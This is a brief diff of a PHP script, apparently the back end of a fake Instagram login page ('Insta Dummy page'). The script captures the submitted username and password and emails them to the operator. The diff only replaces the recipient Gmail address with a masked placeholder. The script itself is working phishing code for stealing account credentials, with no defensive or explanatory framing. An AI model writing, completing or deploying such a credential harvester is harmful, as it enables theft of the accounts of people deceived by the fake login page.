@@ -4,7 +4,7 @@
 $username = $_REQUEST['u_name'];  // fetch username
  $passcode = $_REQUEST['pass'];  // fetch password
  $subject = "Someone Login ! Insta Dummy page";
- $to ="dummyducky0@gmail.com";
+ $to ="xxxxxxxx@gmail.com";
  
  $txt = "Username : ". $username. "\r\nPassword : ". $passcode ; // email body (i) username [break] (ii) password;
  
